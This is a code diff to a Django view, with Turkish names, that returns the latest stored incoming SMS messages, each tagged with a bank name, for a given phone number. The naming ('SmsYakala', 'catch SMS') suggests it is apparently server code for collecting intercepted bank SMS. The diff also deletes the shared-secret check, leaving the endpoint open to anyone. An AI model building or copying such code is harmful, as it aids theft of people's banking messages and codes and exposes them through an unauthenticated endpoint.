@@ -198,14 +198,14 @@ def SmsYakala(request):
 def sms_getir(request):
     if request.method == 'POST':
         python = request.POST['Python']
-        if python == 'SukurlerOlsun':
-            numarasi = request.POST['numarasi']
-            smsler = GelenSMS.objects.filter(numara=numarasi).order_by('-id')[:10]
-            if smsler.exists():
-                sonuc = "|".join([f"{sms.id},{sms.banka},{sms.mesaj}" for sms in smsler])
-                return HttpResponse(sonuc)
-            else:
-                return HttpResponse("SonucMesajYok!")
+
+        numarasi = request.POST['numarasi']
+        smsler = GelenSMS.objects.filter(numara=numarasi).order_by('-id')[:10]
+        if smsler.exists():
+            sonuc = "|".join([f"{sms.id},{sms.banka},{sms.mesaj}" for sms in smsler])
+            return HttpResponse(sonuc)
+        else:
+            return HttpResponse("SonucMesajYok!")
     else:
         return HttpResponse({"SonucHatali"})
 
